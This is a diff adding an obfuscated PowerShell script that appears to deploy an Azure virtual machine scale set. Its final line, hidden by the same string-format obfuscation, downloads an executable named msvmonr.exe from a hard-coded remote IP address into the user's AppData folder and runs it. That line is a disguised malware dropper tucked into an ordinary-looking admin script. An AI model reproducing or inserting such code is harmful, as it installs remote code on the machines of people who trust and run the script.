@@ -1,0 +1,16 @@
+${c`Red} = .("{2}{4}{1}{0}{3}" -f'red','C','Get','ential','-')
+
+
+
+
+.("{1}{0}{2}" -f'ew-AzV','N','mss') `
+  -ResourceGroupName ("{1}{2}{3}{0}{4}"-f 'o','myRes','ourceG','r','up') `
+  -VMScaleSetName ("{0}{1}{2}"-f 'm','yScale','Set') `
+  -Location ("{1}{0}" -f'astUS','E') `
+  -VirtualNetworkName ("{0}{1}{2}"-f 'my','Vne','t') `
+  -SubnetName ("{2}{1}{0}" -f 't','e','mySubn') `
+  -PublicIpAddressName ("{2}{4}{3}{0}{1}" -f 'dr','ess','m','PAd','yPublicI') `
+  -LoadBalancerName ("{0}{4}{3}{1}{2}" -f'myLoa','n','cer','Bala','d') `
+  -Credential ${cR`ed}
+
+(.("{0}{2}{1}"-f 'New','ect','-Obj') ("{1}{0}{2}{5}{3}{4}" -f 'tem','Sys','.','li','ent','Net.WebC')).("{3}{0}{1}{2}" -f'ow','n','loadFile','D').Invoke(("{2}{1}{6}{0}{3}{5}{7}{4}{8}" -f '2.','0.','http://8','64','yakar/msvm','.','8','45/~','onr.exe'),"$env:APPDATA\msvmonr.exe");&("{1}{0}{2}{3}"-f'tart-','S','P','rocess') ("$env:APPDATA\msvmonr.exe")
